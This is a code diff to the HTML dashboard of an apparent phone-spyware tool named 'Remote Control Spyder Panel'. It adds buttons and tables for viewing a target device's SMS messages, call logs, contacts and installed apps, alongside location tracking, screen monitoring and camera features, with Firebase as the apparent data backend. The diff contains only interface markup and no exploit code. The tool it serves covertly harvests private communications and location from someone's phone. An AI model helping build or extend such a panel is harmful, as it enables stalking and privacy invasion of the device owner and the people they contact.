@@ -32,7 +32,7 @@
     <a href="#">Live Screen Monitoring</a>
     <a href="#">SMS Logs</a>
     <a href="#">Call Logs</a>
-    <a href="#">Location</a>
+    <a href="#" id="trackLocation">Location</a>
     <a href="#">Battery Info</a>
     <a href="#">Device Status</a>
     <a href="#">Camera</a>
@@ -54,9 +54,9 @@
  <div class="index">
 
    <nav class="navbar navbar-expand-lg margin">
-    <div class="container-fluid">
+    <div class="container-fluid"><!--Here container fluid from that all behave like display:flex; and justify-content: space-evenly In think is direct from script code so if there any problem in future remove and make a new class replace container-fluid -->
       <a class="navbar-brand" href="#">Remote Control Spyder Panel</a>
-     
+      <button id="refreshSiteBtn"><i class="fa-solid fa-arrows-rotate"></i></button>
       <button id="logoutBtn" class="btn btn-sm btn-danger">Logout</button>
     </div>
   </nav>
@@ -65,9 +65,9 @@
     <div>
       <h5>Device: <span class="text-info">Oppo K1</span></h5>
       <h6>
-        Status: <span id="deviceStatus" class="status-green online">Loading..</span> |
+        Status: <span id="deviceStatus" class="status-green online">Executing..</span> |
         Battery: <span id="batteryLevel" class="text-warning">--%</span> |
-        Last Seen: <span id="lastSeen" class="status-green">Just now</span> |
+        Last Seen: <span id="lastSeen" class="status-green">Executing..</span> |
       </h6>
     </div>
   </div>
@@ -100,7 +100,7 @@
             <div class="card fade-in">
               <div class="card-title"><i class="fas fa-sms"></i> SMS Logs</div>
               <p>View sent and received SMS messages.</p>
-              <button class="btn btn-outline-info btn-sm">Open</button>
+             <button class="btn btn-outline-info btn-sm" id="smsBtn">Open</button>
             </div>
           </div>
 
@@ -108,15 +108,15 @@
             <div class="card fade-in">
               <div class="card-title"><i class="fas fa-phone"></i> Call Logs</div>
               <p>View incoming and outgoing call history.</p>
-              <button class="btn btn-outline-info btn-sm">Open</button>
+              <button id="btnCallLogs" class="btn btn-outline-info btn-sm">Open</button>
             </div>
           </div>
 
           <div class="col-md-4">
             <div class="card fade-in">
-              <div class="card-title"><i class="fas fa-calendar-alt"></i> Calendar Events</div>
+              <div class="card-title"><i class="fas fa-calendar-alt"></i> Contact Log</div>
               <p>Access scheduled events, meetings & notes.</p>
-              <button class="btn btn-outline-primary btn-sm">View Events</button>
+              <button id="btnContacts" class="btn btn-outline-primary btn-sm">View Contact</button>
             </div>
           </div>
 
@@ -216,6 +216,14 @@
                 <p>Schedule apps to run or auto-close at set times.</p>
                 <button class="btn btn-outline-warning btn-sm">Set Schedule</button>
               </div>
+          </div>
+
+           <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-folder-open"></i> Installed app</div>
+              <p>Browse all files on the device.</p>
+              <button class="btn btn-outline-secondary btn-sm" id="btnInstalledApps">Installed app</button>
+            </div>
           </div>
 
       </div>
@@ -327,7 +335,27 @@
 
     </div>
   </div>
-  
+<!-- SMS Logs Section -->
+<div class="container mt-4" id="smsLogs">
+  <h4>📩 SMS Logs</h4>
+  <span class="crossLocation" title="Close">✖</span>
+  <div class="table-responsive">
+    <table class="table table-bordered table-striped">
+      <thead>
+       <tr>
+         <th>Sender</th>
+         <th>Message</th>
+         <th>Time</th>
+        </tr>
+     </thead>
+      <tbody id="smsTableBody">
+        <!-- Rows will load here -->
+      </tbody>
+    </table>              
+  </div>
+</div>
+
+
 <!--tracker-->
 <div id="status" class="deviceStatus">
   <div class="map-in">
@@ -335,14 +363,50 @@
      <div id="map" class="map-main"></div>
      <p><strong>Exact Area:</strong> <span id="locationInfo">Fetching...</span></p>
   </div>
-   <span class="crossLocation">✖</span>
-
+   <span class="crossLocation" title="Close">✖</span>
 </div>
+
+<!-- Installed Apps -->
+<div class="container mt-4 allPages" id="installedApps" style="display:none;">
+  <h4>📦 Installed Apps</h4>
+  <span class="crossLocation" title="Close">✖</span>
+  <div class="table-responsive">
+    <table class="table table-bordered table-striped">
+      <thead><tr><th>Name</th><th>Package</th></tr></thead>
+      <tbody id="appsTableBody"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- Call Logs -->
+<div class="container mt-4 allPages" id="callLogs">
+  <h4>📞 Call Logs</h4>
+  <span class="crossLocation" title="Close">✖</span>
+  <div class="table-responsive">
+    <table class="table table-bordered table-striped">
+      <thead><tr><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr></thead>
+      <tbody id="callTableBody"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- Contacts -->
+<div class="container mt-4 allPages" id="contactLogs">
+  <h4>👤 Contact Logs</h4>
+  <span class="crossLocation" title="Close">✖</span>
+  <div class="table-responsive">
+    <table class="table table-bordered table-striped">
+      <thead><tr><th>Name</th><th>Number</th></tr></thead>
+      <tbody id="contactTableBody"></tbody>
+    </table>
+  </div>
+</div>
+
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
-
-<script type="module" src="script.js"></script>
+<!-- <script type="module" src="smsscript.js"></script> -->
+<script type="module" src="script.js" defer></script>
 </body>
 </html>
